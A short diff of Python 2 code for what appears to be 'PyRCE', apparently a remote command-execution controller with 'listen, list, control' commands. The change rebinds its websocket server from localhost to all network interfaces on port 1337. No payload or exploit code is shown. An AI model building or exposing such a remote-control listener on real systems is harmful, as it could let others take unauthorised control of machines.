@@ -11,7 +11,7 @@ from sockets import WebsocketServer
 if __name__ == "__main__":
 
     try:
-        server = WebsocketServer("localhost", 1337)
+        server = WebsocketServer("0.0.0.0", 1337)
         global listener_thread
 
         print "PyRCE - Commands: listen, list, control"
